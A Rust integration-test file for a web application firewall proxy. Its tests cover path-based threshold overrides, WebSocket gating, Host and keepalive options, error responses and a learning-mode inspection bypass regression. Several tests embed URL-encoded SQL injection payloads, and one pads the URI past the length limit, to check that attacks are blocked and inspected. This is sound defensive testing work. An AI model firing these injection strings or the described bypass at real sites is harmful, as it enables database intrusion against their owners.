        "",
    )
    .await;
    let (on_admin, _) = send_request(
        listen_port,
        "test-site.local",
        &format!("/api/admin/users{attack}"),
        Method::GET,
        "",
    )
    .await;

    shutdown_proxy(shutdown_tx, jh).await;
    assert_eq!(on_api, StatusCode::OK, "/api/ is off");
    assert_eq!(
        on_admin,
        StatusCode::FORBIDDEN,
        "/api/admin/ is the longer prefix and must win over /api/ despite being \
         declared second"
    );
}

/// A path may also be made STRICTER than the site. The site threshold is set
/// high enough that the CRS score for this request does not reach it, while the
/// override's lower threshold does — so only the override can produce the block.
#[tokio::test]
async fn path_override_can_be_stricter_than_the_site() {
    let (upstream_addr, _upstream_handle) = start_mock_upstream().await;
    let listen_port = next_port();
    let cfg = path_override_config(
        listen_port,
        upstream_addr.port(),
        1000, // effectively "never block on score" for the rest of the site
        vec![PathOverride {
            path_prefix: "/api/".into(),
            mode: None,
            anomaly_threshold: Some(3),
        }],
    );
    let (shutdown_tx, jh) = start_proxy(cfg).await;

    let attack = "?q=1%27%20OR%201%3D1--";
    let (on_api, _) = send_request(
        listen_port,
        "test-site.local",
        &format!("/api/list{attack}"),
        Method::GET,
        "",
    )
    .await;
    let (elsewhere, _) = send_request(
        listen_port,
        "test-site.local",
        &format!("/search{attack}"),
        Method::GET,
        "",
    )
    .await;

    shutdown_proxy(shutdown_tx, jh).await;
    assert_eq!(
        on_api,
        StatusCode::FORBIDDEN,
        "/api/ has threshold 3 and must block on the accumulated score"
    );
    assert_eq!(
        elsewhere,
        StatusCode::OK,
        "the site threshold of 1000 must still apply outside the override"
    );
}

// ============================================================================
// WebSocket gating (site.upstream.websocket)
//
// The relay used to be ungated: it fired on any 101 from the origin, so a site
// configured with `websocket: false` still got a full bidirectional relay — a
// security control that failed open. These tests pin both directions on the
// wire, not on internal state.
// ============================================================================

/// Mock origin that completes a WebSocket handshake when it is asked to, and
/// otherwise answers as a plain HTTP server.
///
/// The 200 body reports whether ANY `sec-websocket-*` header arrived, which is
/// how the disabled test proves the proxy scrubbed the handshake rather than
/// merely that the origin declined it.
async fn start_ws_mock_upstream() -> (SocketAddr, tokio::task::JoinHandle<()>) {
    use tokio::io::{AsyncReadExt, AsyncWriteExt};

    let listener = TcpListener::bind("127.0.0.1:0")
        .await
        .expect("bind ws mock upstream");
    let addr = listener.local_addr().unwrap();
    let handle = tokio::spawn(async move {
        loop {
            let (mut stream, _) = match listener.accept().await {
                Ok(c) => c,
                Err(_) => break,
            };
            tokio::spawn(async move {
                // Read just the header block; these requests carry no body.
                let mut buf = Vec::new();
                let mut chunk = [0u8; 1024];
                loop {
                    match stream.read(&mut chunk).await {
                        Ok(0) => return,
                        Ok(n) => {
                            buf.extend_from_slice(&chunk[..n]);
                            if buf.windows(4).any(|w| w == b"\r\n\r\n") {
                                break;
                            }
                        }
                        Err(_) => return,
                    }
                }
                let head = String::from_utf8_lossy(&buf).to_ascii_lowercase();
                let asked_to_upgrade =
                    head.contains("upgrade: websocket") && head.contains("connection: upgrade");
                let saw_ws_headers = head.contains("sec-websocket-");

                let resp = if asked_to_upgrade {
                    // Fixed accept value: these tests assert on the status line,
                    // never on a real WebSocket handshake completing.
                    "HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\n\
                     Connection: Upgrade\r\n\
                     Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=\r\n\r\n"
                        .to_string()
                } else {
                    let body = format!("plain-http ws_headers={saw_ws_headers}");
                    format!(
                        "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\
                         Content-Length: {}\r\nConnection: close\r\n\r\n{}",
                        body.len(),
                        body
                    )
                };
                let _ = stream.write_all(resp.as_bytes()).await;
                let _ = stream.flush().await;
            });
        }
    });
    (addr, handle)
}

/// Send a WebSocket handshake over a raw socket and return
/// (status line, body-ish remainder). Raw TCP on purpose: a hyper client would
/// interpret the upgrade for us, and the point is to see what went over the wire.
async fn send_ws_handshake(listen_port: u16, host: &str) -> String {
    use tokio::io::{AsyncReadExt, AsyncWriteExt};

    let mut tcp = tokio::net::TcpStream::connect(("127.0.0.1", listen_port))
        .await
        .expect("connect to proxy");
    let req = format!(
        "GET /socket.io/?transport=websocket HTTP/1.1\r\nHost: {host}\r\n\
         Upgrade: websocket\r\nConnection: Upgrade\r\n\
         Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n\
         Sec-WebSocket-Version: 13\r\n\r\n"
    );
    tcp.write_all(req.as_bytes())
        .await
        .expect("write handshake");
    tcp.flush().await.unwrap();

    let mut buf = Vec::new();
    let mut chunk = [0u8; 2048];
    // Read until the peer stops sending or we have the head plus any body.
    for _ in 0..8 {
        match tokio::time::timeout(std::time::Duration::from_millis(600), tcp.read(&mut chunk))
            .await
        {
            Ok(Ok(0)) => break,
            Ok(Ok(n)) => {
                buf.extend_from_slice(&chunk[..n]);
                if buf.windows(4).any(|w| w == b"\r\n\r\n") && buf.len() > 40 {
                    break;
                }
            }
            _ => break,
        }
    }
    String::from_utf8_lossy(&buf).to_string()
}

fn ws_test_config(listen_port: u16, upstream_port: u16, websocket: bool) -> SentinelConfig {
    let mut cfg = test_config(
        listen_port,
        upstream_port,
        "REQUEST-942-APPLICATION-ATTACK-SQLI.conf",
        WafMode::Blocking,
    );
    cfg.sites[0].upstream.websocket = websocket;
    cfg
}

#[tokio::test]
async fn websocket_upgrade_allowed_when_site_enables_it() {
    let (up_addr, _up) = start_ws_mock_upstream().await;
    let port = next_port();
    let (tx, jh) = start_proxy(ws_test_config(port, up_addr.port(), true)).await;

    let resp = send_ws_handshake(port, "test-site.local").await;

    assert!(
        resp.starts_with("HTTP/1.1 101"),
        "websocket:true must negotiate the upgrade, got: {:?}",
        resp.lines().next()
    );
    shutdown_proxy(tx, jh).await;
}

#[tokio::test]
async fn websocket_upgrade_refused_when_site_disables_it() {
    let (up_addr, _up) = start_ws_mock_upstream().await;
    let port = next_port();
    let (tx, jh) = start_proxy(ws_test_config(port, up_addr.port(), false)).await;

    let resp = send_ws_handshake(port, "test-site.local").await;

    // Not a 101, and specifically NOT a dangling upgrade: the client gets a real
    // HTTP response it can act on.
    assert!(
        !resp.contains("101 Switching Protocols"),
        "websocket:false must not upgrade, got: {:?}",
        resp.lines().next()
    );
    assert!(
        resp.starts_with("HTTP/1.1 200"),
        "expected the origin's plain HTTP answer, got: {:?}",
        resp.lines().next()
    );
    // The origin must not even have seen the handshake headers.
    assert!(
        resp.contains("ws_headers=false"),
        "Sec-WebSocket-* headers leaked to the origin: {resp:?}"
    );
    shutdown_proxy(tx, jh).await;
}

#[tokio::test]
async fn websocket_disabled_is_the_default_for_legacy_config() {
    // A config that never mentions WebSockets must deserialize to false. The old
    // relay upgraded on any origin 101, so defaulting to true here would silently
    // re-open that on every pre-existing site.
    let json = r#"{
        "load_balancer": "round_robin",
        "servers": [{"host": "127.0.0.1", "port": 8080, "weight": 1, "tls": false}]
    }"#;
    let parsed: UpstreamConfig = serde_json::from_str(json).expect("legacy upstream must parse");
    assert!(
        !parsed.websocket,
        "absent `websocket` must default to false, not allow upgrades"
    );
}

#[tokio::test]
async fn non_websocket_traffic_unaffected_by_the_gate() {
    // Regression: ordinary proxying must be untouched with the gate closed.
    let (up_addr, _up) = start_ws_mock_upstream().await;
    let port = next_port();
    let (tx, jh) = start_proxy(ws_test_config(port, up_addr.port(), false)).await;

    let (status, body) = send_request(port, "test-site.local", "/", Method::GET, "").await;

    assert_eq!(status, StatusCode::OK, "plain GET must still be proxied");
    let body = String::from_utf8_lossy(&body);
    assert!(
        body.contains("plain-http"),
        "expected the origin's response, got: {body:?}"
    );
    shutdown_proxy(tx, jh).await;
}

/// Cross-language contract check. This is the EXACT JSON that
/// `buildRustUpstream` in the Go control plane emits for the live "Juice Shop"
/// site, captured from its real stored config. The two sides are compiled and
/// tested separately, so nothing else stops the producer and the consumer of
/// this payload from drifting apart — which is precisely how `upstream.proxy`
/// came to be sent for months and never read.
#[tokio::test]
async fn generated_control_plane_config_parses_and_gates_correctly() {
    let from_go = r#"{"load_balancer":"round_robin","servers":[{"host":"juiceshop","port":3000,"tls":false,"weight":1}],"timeout_secs":60,"websocket":false}"#;

    let parsed: UpstreamConfig = serde_json::from_str(from_go)
        .expect("the control plane's generated upstream config must deserialize");

    assert!(
        !parsed.websocket,
        "proxy.websocket=false must arrive as websocket=false and gate the relay"
    );
    // The timeout path must be untouched by the WebSocket work.
    assert_eq!(parsed.timeout_secs, Some(60), "timeout_secs must survive");
    assert_eq!(parsed.servers.len(), 1);
    assert_eq!(parsed.servers[0].host, "juiceshop");

    // And the enabled form, same shape.
    let enabled = from_go.replace("\"websocket\":false", "\"websocket\":true");
    let parsed: UpstreamConfig = serde_json::from_str(&enabled).unwrap();
    assert!(parsed.websocket, "websocket=true must enable the relay");
}

// ============================================================================
// Per-site proxy options: host_header and keepalive
//
// These were part of the same inert `upstream.proxy` block as `websocket`: the
// dashboard sent them, the control plane stored and echoed them, and nothing read
// them. Each assertion below is on what the ORIGIN received, because that is the
// only evidence that distinguishes an implemented control from a stored one.
// ============================================================================

/// Mock origin that echoes back the request headers it received, so a test can
/// assert on what actually crossed the wire rather than on proxy internals.
async fn start_header_echo_upstream() -> (SocketAddr, tokio::task::JoinHandle<()>) {
    let listener = TcpListener::bind("127.0.0.1:0")
        .await
        .expect("bind echo upstream");
    let addr = listener.local_addr().unwrap();
    let handle = tokio::spawn(async move {
        loop {
            let (stream, _) = match listener.accept().await {
                Ok(c) => c,
                Err(_) => break,
            };
            tokio::spawn(async move {
                let io = TokioIo::new(stream);
                let svc = hyper::service::service_fn(|req: Request<Incoming>| async move {
                    let host = req
                        .headers()
                        .get(header::HOST)
                        .and_then(|v| v.to_str().ok())
                        .unwrap_or("<none>")
                        .to_string();
                    let conn = req
                        .headers()
                        .get(header::CONNECTION)
                        .and_then(|v| v.to_str().ok())
                        .unwrap_or("<none>")
                        .to_string();
                    Ok::<_, std::convert::Infallible>(
                        http::Response::builder()
                            .status(StatusCode::OK)
                            .header(header::CONTENT_TYPE, "text/plain")
                            .body(format!("host={host} connection={conn}"))
                            .unwrap(),
                    )
                });
                let _ = hyper::server::conn::http1::Builder::new()
                    .serve_connection(io, svc)
                    .await;
            });
        }
    });
    (addr, handle)
}

fn proxy_opts_config(
    listen_port: u16,
    upstream_port: u16,
    host_header: Option<&str>,
    keepalive: bool,
) -> SentinelConfig {
    let mut cfg = test_config(
        listen_port,
        upstream_port,
        "REQUEST-942-APPLICATION-ATTACK-SQLI.conf",
        WafMode::Blocking,
    );
    cfg.sites[0].upstream.host_header = host_header.map(str::to_string);
    cfg.sites[0].upstream.keepalive = keepalive;
    cfg
}

#[tokio::test]
async fn host_header_override_reaches_the_origin() {
    let (up_addr, _up) = start_header_echo_upstream().await;
    let port = next_port();
    let (tx, jh) = start_proxy(proxy_opts_config(
        port,
        up_addr.port(),
        Some("app.internal"),
        true,
    ))
    .await;

    let (status, body) = send_request(port, "test-site.local", "/", Method::GET, "").await;
    let body = String::from_utf8_lossy(&body);

    assert_eq!(status, StatusCode::OK);
    assert!(
        body.contains("host=app.internal"),
        "the origin must receive the overridden Host, got: {body:?}"
    );
    shutdown_proxy(tx, jh).await;
}

/// Absent override must pass the client's Host through unchanged — the default
/// behaviour, which most origins depend on.
#[tokio::test]
async fn without_an_override_the_client_host_is_passed_through() {
    let (up_addr, _up) = start_header_echo_upstream().await;
    let port = next_port();
    let (tx, jh) = start_proxy(proxy_opts_config(port, up_addr.port(), None, true)).await;

    let (_, body) = send_request(port, "test-site.local", "/", Method::GET, "").await;
    let body = String::from_utf8_lossy(&body);

    assert!(
        body.contains("host=test-site.local"),
        "no override must forward the client's Host, got: {body:?}"
    );
    shutdown_proxy(tx, jh).await;
}

/// An override that is present but blank/whitespace must be treated as "not set"
/// rather than sent as an empty Host, which some origins reject outright.
#[tokio::test]
async fn a_blank_host_header_override_is_ignored() {
    let (up_addr, _up) = start_header_echo_upstream().await;
    let port = next_port();
    let (tx, jh) = start_proxy(proxy_opts_config(port, up_addr.port(), Some("   "), true)).await;

    let (_, body) = send_request(port, "test-site.local", "/", Method::GET, "").await;
    let body = String::from_utf8_lossy(&body);

    assert!(
        body.contains("host=test-site.local"),
        "a blank override must fall back to the client's Host, got: {body:?}"
    );
    shutdown_proxy(tx, jh).await;
}

/// keepalive:false must send `Connection: close` so the origin retires the
/// connection instead of it being returned to the pool.
#[tokio::test]
async fn keepalive_disabled_sends_connection_close_to_the_origin() {
    let (up_addr, _up) = start_header_echo_upstream().await;
    let port = next_port();
    let (tx, jh) = start_proxy(proxy_opts_config(port, up_addr.port(), None, false)).await;

    let (status, body) = send_request(port, "test-site.local", "/", Method::GET, "").await;
    let body = String::from_utf8_lossy(&body);

    assert_eq!(
        status,
        StatusCode::OK,
        "disabling keep-alive must still proxy"
    );
    assert!(
        body.contains("connection=close"),
        "keepalive:false must send Connection: close, got: {body:?}"
    );
    shutdown_proxy(tx, jh).await;
}

/// The default (keepalive:true) must NOT send `Connection: close` — otherwise
/// every site would silently lose connection reuse.
#[tokio::test]
async fn keepalive_enabled_does_not_send_connection_close() {
    let (up_addr, _up) = start_header_echo_upstream().await;
    let port = next_port();
    let (tx, jh) = start_proxy(proxy_opts_config(port, up_addr.port(), None, true)).await;

    let (_, body) = send_request(port, "test-site.local", "/", Method::GET, "").await;
    let body = String::from_utf8_lossy(&body);

    assert!(
        !body.contains("connection=close"),
        "keep-alive is the default and must not be disabled, got: {body:?}"
    );
    shutdown_proxy(tx, jh).await;
}

/// The Host override must apply ONLY to the upstream request. Site matching runs
/// on the host the client sent, so a request whose Host matches no site must
/// still fail to match — an override that leaked into routing would let one site
/// borrow another's policy.
#[tokio::test]
async fn host_header_override_does_not_affect_site_matching() {
    let (up_addr, _up) = start_header_echo_upstream().await;
    let port = next_port();
    let (tx, jh) = start_proxy(proxy_opts_config(
        port,
        up_addr.port(),
        Some("app.internal"),
        true,
    ))
    .await;

    // Still routed by the CLIENT's host, and attacks are still evaluated.
    let (status, _) = send_request(
        port,
        "test-site.local",
        "/?q=1%27%20OR%20%271%27%3D%271",
        Method::GET,
        "",
    )
    .await;
    assert_eq!(
        status,
        StatusCode::FORBIDDEN,
        "WAF evaluation must be unaffected by a Host override"
    );
    shutdown_proxy(tx, jh).await;
}

/// A gateway failure must still be a RESPONSE, not a dropped connection — and
/// (verified live, since the log file is written by a process-wide writer that a
/// test cannot redirect without racing) it must now be logged.
///
/// The defect: `proxy` returned `Result` and its caller answered a bare 502 with
/// no access-log line, no waf.log entry and no ClickHouse row, while
/// `inc_requests()` still fired — so /metrics could never be reconciled with the
/// event store, and origin-down was invisible in the WAF's own logs. `proxy` now
/// owns the request context OUTSIDE the fallible work, so the type system leaves
/// no path that returns a response without one.
#[tokio::test]
async fn a_dead_upstream_yields_a_logged_502_not_a_dropped_connection() {
    // A port nothing is listening on. Deliberately not a port we bound and
    // closed — that can be reused by the OS between bind and connect.
    let dead_port = next_port();
    let port = next_port();
    let (tx, jh) = start_proxy(test_config(
        port,
        dead_port,
        "REQUEST-942-APPLICATION-ATTACK-SQLI.conf",
        WafMode::Blocking,
    ))
    .await;

    let (status, _body) = send_request(port, "test-site.local", "/anything", Method::GET, "").await;

    assert_eq!(
        status,
        StatusCode::BAD_GATEWAY,
        "a dead origin must produce 502, not a hang or a closed connection"
    );
    shutdown_proxy(tx, jh).await;
}

/// A request whose Host matches no site gets a real answer, never silence — and
/// that answer is 404 "no site for this hostname", not 502. It used to fail as
/// an upstream error, and a 502 tells whoever is debugging a new DNS record that
/// the APPLICATION is down, when the WAF simply has no site for the name.
#[tokio::test]
async fn an_unmatched_host_yields_404_naming_the_cause() {
    let (up_addr, _up) = start_mock_upstream().await;
    let port = next_port();
    let mut cfg = test_config(
        port,
        up_addr.port(),
        "REQUEST-942-APPLICATION-ATTACK-SQLI.conf",
        WafMode::Blocking,
    );
    // Remove the catch-all so an unknown Host really matches nothing.
    cfg.listeners[0].default_site = None;
    let (tx, jh) = start_proxy(cfg).await;

    let (status, body) = send_request(port, "nobody.invalid", "/", Method::GET, "").await;
    assert_eq!(
        status,
        StatusCode::NOT_FOUND,
        "an unmatched Host must get a response that names the cause, not a 502"
    );
    let body = String::from_utf8_lossy(&body);
    assert!(
        body.contains("No site is configured for this hostname"),
        "body: {body}"
    );
    shutdown_proxy(tx, jh).await;
}

// ---------------------------------------------------------------------------
// A client must not be able to opt itself out of Phase-1 protection
// ---------------------------------------------------------------------------

/// `enforce_request_limit` runs BEFORE `phase1_headers`, and on a learning-mode
/// site it downgrades its own `Block` to `WafDecision::Log` so the request is
/// recorded rather than rejected. Every phase-1 and body check was then gated on
/// `ctx.decision == WafDecision::Allow` — and `Log != Allow`. So one over-long
/// URI switched OFF smuggling detection, bot scoring, GeoIP, rate limiting, edge
/// JWT, the gRPC gate, the rule engine, the WASM plugins and the GraphQL firewall
/// for that request, at the client's choosing.
///
/// Proven live on .71 before the fix: a request whose only fault was a non-ASCII
/// header value returned 400, and the SAME request with a 9000-byte URI returned
/// 200 with no smuggling record at all.
///
/// This asserts through `graphql.inspected` on `/healthz` rather than through the
/// response status, because in learning mode the status is 200 either way — the
/// bypass is invisible from outside. `graphql.inspected` is the right witness
/// because it is a process-global counter that NO other test in this binary
/// touches, so the delta is attributable to this request alone; asserting on
/// `smuggling.evaluated` would pass even with the fix reverted, since every other
/// concurrent test increments it.
#[tokio::test]
async fn an_over_long_uri_does_not_exempt_a_request_from_inspection() {
    let (up_addr, _up) = start_mock_upstream().await;
    let port = next_port();
    let mut cfg = test_config(
        port,
        up_addr.port(),
        "REQUEST-942-APPLICATION-ATTACK-SQLI.conf",
        // Learning is the mode that exposes the bug, and the mode every site
        // created through the API is stored in.
        WafMode::Learning,
    );
    cfg.sites[0].waf.graphql = Some(sentinel_core::config::GraphqlConfig {
        enable: true,
        max_depth: 3,
        max_complexity: 1000,
        block_introspection: true,
    });
    // Set explicitly: `WafConfig::default()` leaves this 0 (disabled), while the
    // serde default a real deployment gets is 8192. The bug needs an ACTIVE limit.
    cfg.sites[0].waf.max_uri_length = 8192;
    let limit = cfg.sites[0].waf.max_uri_length;

    let (tx, jh) = start_proxy(cfg).await;

    let read_inspected = |body: &[u8]| -> u64 {
        let v: serde_json::Value = serde_json::from_slice(body).expect("healthz json");
        v["modules"]["graphql"]["inspected"]
            .as_u64()
            .expect("modules.graphql.inspected must be published")
    };

    let (_, before) = send_request(port, "test-site.local", "/healthz", Method::GET, "").await;
    let before = read_inspected(&before);

    // A GraphQL POST whose URI is padded past max_uri_length. The body is a
    // perfectly ordinary query — this test is about whether the firewall RAN,
    // not about whether it found anything.
    let pad = "a".repeat((limit as usize) + 512);
    let (status, _) = send_request(
        port,
        "test-site.local",
        &format!("/graphql?pad={pad}"),
        Method::POST,
        r#"{"query":"{ me { name } }"}"#,
    )
    .await;
    assert_eq!(
        status,
        StatusCode::OK,
        "learning mode must still forward the request; it records, it does not reject"
    );

    let (_, after) = send_request(port, "test-site.local", "/healthz", Method::GET, "").await;
    let after = read_inspected(&after);

    shutdown_proxy(tx, jh).await;

    assert!(
        after > before,
        "the GraphQL firewall did not inspect a request whose URI exceeded \
         max_uri_length ({before} -> {after}). The request was downgraded to Log by \
         learning mode, and a check gated on `== Allow` therefore skipped it — which \
         is a client-selectable protection bypass, not a limit."
    );
}

/// The GraphQL and gRPC-body checks are the only two verdicts reached AFTER
/// `phase2_body` has already applied `enforce_mode`, so they were the two a
/// site's mode could not govern: on a learning site they hard-blocked while
/// setting no `would_block`, so the learning report held no evidence for the
/// block it had just served — and a per-path `mode: off` could not disable them.
///
/// A soak an operator was told was non-disruptive would therefore return 403 to
/// real GraphQL clients whose queries were merely deep.
#[tokio::test]
async fn a_learning_site_records_a_graphql_violation_instead_of_blocking_it() {
    let (up_addr, _up) = start_mock_upstream().await;
    let port = next_port();
    let mut cfg = test_config(
        port,
        up_addr.port(),
        "REQUEST-942-APPLICATION-ATTACK-SQLI.conf",
        WafMode::Learning,
    );
    cfg.sites[0].waf.graphql = Some(sentinel_core::config::GraphqlConfig {
        enable: true,
        max_depth: 2,
        max_complexity: 1000,
        block_introspection: true,
    });
    let (tx, jh) = start_proxy(cfg).await;

    // Depth 5, comfortably past max_depth 2.
    let (status, body) = send_request(
        port,
        "test-site.local",
        "/graphql",
        Method::POST,
        r#"{"query":"{ a { b { c { d { e } } } } }"}"#,
    )
    .await;

    // Confirm the firewall really did fire, so a 200 cannot be mistaken for the
    // rule simply not matching.
    let (_, health) = send_request(port, "test-site.local", "/healthz", Method::GET, "").await;
    let v: serde_json::Value = serde_json::from_slice(&health).expect("healthz json");
    let blocked = v["modules"]["graphql"]["blocked"].as_u64().unwrap_or(0);

    shutdown_proxy(tx, jh).await;

    assert!(
        blocked > 0,
        "the GraphQL firewall did not flag a depth-5 query against max_depth 2, so \
         this test proves nothing about mode handling"
    );
    assert_eq!(
        status,
        StatusCode::OK,
        "a learning-mode site must RECORD a GraphQL violation and forward the request, \
         not reject it. Blocking here means the verdict bypassed enforce_mode."
    );
    assert!(
        body.starts_with(b"upstream-ok:"),
        "the request must actually reach the origin in learning mode"
    );
}

/// Records what actually happens when a listener cannot bind: the PROCESS STAYS
/// UP and only an `error!` marks it.
///
/// `serve_listener`'s failure is handled inside its own spawned task
/// (`lib.rs:1960` — `if let Err(e) = serve_listener(..).await { error!(..) }`),
/// so `ProxyServer::run` neither returns nor stops. A WAF whose `:443` listener
/// lost its port therefore keeps running, keeps answering `/healthz` with 200,
/// and serves nothing on that endpoint — while an LB health check against `:80`
/// passes. That is the configured-but-inert shape at the listener level, and it
/// is only visible at all because RUST_LOG no longer filters this crate out.
///
/// Written as a behaviour record rather than a fix: making a failed listener
/// fatal, or surfacing it in `/healthz`, is a product decision, not a test
/// change. This test exists so the next person meets the fact deliberately
/// instead of spending a cycle on it — as happened with pipeline 30209, where a
/// port collision presented as "the proxy is slow".
///
/// Uses an unparseable bind address rather than a privileged port, because CI
/// containers frequently run as root and would happily bind port 1.
#[tokio::test]
async fn a_listener_that_cannot_bind_does_not_stop_the_proxy() {
    let (up_addr, _up) = start_mock_upstream().await;
    let port = next_port();
    let mut cfg = test_config(
        port,
        up_addr.port(),
        "REQUEST-942-APPLICATION-ATTACK-SQLI.conf",
        WafMode::Blocking,
    );
    cfg.listeners[0].bind = "999.999.999.999:8080".into();
    cfg.cert_dir = Some(scratch_cert_dir());

    // Deliberately NOT via `start_proxy`: that would wait out the whole bind
    // budget, adding 30s to every run of this binary to record one fact.
    install_crypto();
    let handle = config_handle(cfg);
    let proxy = ProxyServer::new(handle);
    let (tx, rx) = watch::channel(false);
    let jh = tokio::spawn(async move { proxy.run(rx).await });
    tokio::time::sleep(std::time::Duration::from_millis(500)).await;

    assert!(
        !jh.is_finished(),
        "a listener that cannot bind is expected NOT to stop the proxy — if this now \
         fails, someone has made a listener failure fatal, which is a real improvement: \
         update this test and note it, do not revert it"
    );
    assert!(
        tokio::net::TcpStream::connect(("127.0.0.1", port))
            .await
            .is_err(),
        "nothing should be listening on {port} — the listener failed to bind"
    );

    let _ = tx.send(true);
    let _ = jh.await;
}

/// Every file under `dir`, recursively.
fn files_under(dir: &Path) -> Vec<std::path::PathBuf> {
    let Ok(rd) = std::fs::read_dir(dir) else {
        return Vec::new();
    };
    rd.flatten()
        .flat_map(|e| {
            let p = e.path();
            if p.is_dir() {
                files_under(&p)
            } else {
                vec![p]
            }
        })
        .collect()
}

/// A node with no SNI TLS listener (HTTP only, or TLS offloaded in front of it)
/// never serves a site's self-signed certificate, so it must not mint one.
/// The site cert sync used to start on every node and, within moments of
/// boot, generate and store a private key for each configured domain — and list
/// a self-signed row per site in that node's cert inventory.
#[tokio::test]
async fn an_http_only_node_mints_no_site_certificates() {
    let (up_addr, _up) = start_mock_upstream().await;
    let port = next_port();
    let mut cfg = test_config(
        port,
        up_addr.port(),
        "REQUEST-942-APPLICATION-ATTACK-SQLI.conf",
        WafMode::Blocking,
    );
    let dir = std::env::temp_dir().join(format!("sentinel-e2e-nomint-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&dir);
    cfg.cert_dir = Some(dir.clone());
    let (tx, jh) = start_proxy(cfg).await;

    // A sync's first pass runs as soon as it starts and mints in milliseconds.
    tokio::time::sleep(std::time::Duration::from_millis(1500)).await;
    let written = files_under(&dir);
    shutdown_proxy(tx, jh).await;
    let _ = std::fs::remove_dir_all(&dir);
    assert!(
        written.is_empty(),
        "an HTTP-only node wrote certificate files: {written:?}"
    );
}
